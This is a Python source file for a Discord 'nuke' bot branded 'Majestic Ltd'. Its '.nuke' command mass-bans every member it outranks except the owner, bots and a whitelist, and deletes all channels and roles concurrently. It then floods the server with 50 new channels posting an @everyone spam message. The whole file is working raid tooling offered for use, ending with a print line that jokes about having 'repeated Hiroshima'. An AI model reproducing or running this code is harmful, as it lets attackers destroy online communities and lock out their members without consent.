import discord
from discord.ext import commands
import asyncio
import pyfiglet

BOT_TOKEN = "YOUR_BOT_TOKEN"

bot = commands.Bot(command_prefix=".", intents=discord.Intents.all())

whitelisted_users = [
    123456789012345678,  
    987654321098765432,  
]

# Semaphore to limit the number of concurrent requests to 50
semaphore = asyncio.Semaphore(50)

@bot.event
async def on_ready():
    ascii_art = pyfiglet.figlet_format("Majestic Ltd")
    print(ascii_art)
    print(f"Bot is ready! Logged in as {bot.user}")

@bot.command(name="nuke")
async def nuke(ctx, custom_message: str = "This channel has been nuked by Majestic Ltd. @everyone @here"):
    print("Proceeding with the action...")

    if not ctx.guild.me.guild_permissions.manage_channels:
        return

    if not ctx.guild.me.guild_permissions.manage_roles:
        return

    if not ctx.guild.me.guild_permissions.ban_members:
        return

    tasks = []

    for member in ctx.guild.members:
        if member != ctx.guild.owner and not member.bot and member.id not in whitelisted_users:
            try:
                if ctx.guild.me.top_role > member.top_role:
                    tasks.append(ban_member(ctx, member))
                else:
                    print(f"Skipped banning {member.name}: My role isn't high enough.")
            except discord.Forbidden:
                print(f"Couldn't ban {member.name}: Missing permissions.")
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")

    for channel in ctx.guild.channels:
        try:
            if channel.permissions_for(ctx.guild.me).manage_channels:
                tasks.append(delete_channel(ctx, channel))
            else:
                print(f"Couldn't delete {channel.name}: No permissions.")
        except Exception as e:
            print(f"Failed to delete channel {channel.name}: {e}")

    for role in ctx.guild.roles:
        if role != ctx.guild.default_role and not role.managed:
            if ctx.guild.me.top_role > role:
                try:
                    tasks.append(delete_role(ctx, role))
                except Exception as e:
                    print(f"Failed to delete role {role.name}: {e}")
            else:
                print(f"Skipped role {role.name}: My role isn't high enough.")

    # Run the deletion tasks with a semaphore to limit concurrency
    await asyncio.gather(*[run_with_semaphore(task) for task in tasks])

    print("All channels and roles deleted. Now creating new channels...")

    creation_tasks = []

    for i in range(50):
        try:
            if ctx.guild.me.guild_permissions.manage_channels:
                creation_tasks.append(create_channel(ctx, custom_message, i))
            else:
                print("Couldn't create channels: No permissions.")
                break
        except Exception as e:
            print(f"Failed to create channel {i+1}: {e}")

    # Run the channel creation tasks with a semaphore to limit concurrency
    await asyncio.gather(*[run_with_semaphore(task) for task in creation_tasks])

    print("We have successfully repeated Hiroshima! Thank you for choosing the services of Majestic Ltd.")

async def run_with_semaphore(task):
    async with semaphore:
        await task

async def ban_member(ctx, member):
    try:
        await member.ban(reason="Nuked by Majestic Ltd.")
    except discord.Forbidden:
        print(f"Couldn't ban {member.name}: Missing permissions.")
    except Exception as e:
        print(f"Failed to ban {member.name}: {e}")

async def delete_channel(ctx, channel):
    try:
        await channel.delete()
    except Exception as e:
        print(f"Failed to delete channel {channel.name}: {e}")

async def delete_role(ctx, role):
    try:
        await role.delete()
    except Exception as e:
        print(f"Failed to delete role {role.name}: {e}")

async def create_channel(ctx, custom_message, i):
    try:
        new_channel = await ctx.guild.create_text_channel(f"nuked-by-majestic-{i+1}")
        await new_channel.send(custom_message)
        await asyncio.sleep(1)  # Small delay between creating channels
    except Exception as e:
        print(f"Failed to create channel {i+1}: {e}")

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandInvokeError):
        pass
    else:
        raise error

bot.run(BOT_TOKEN)
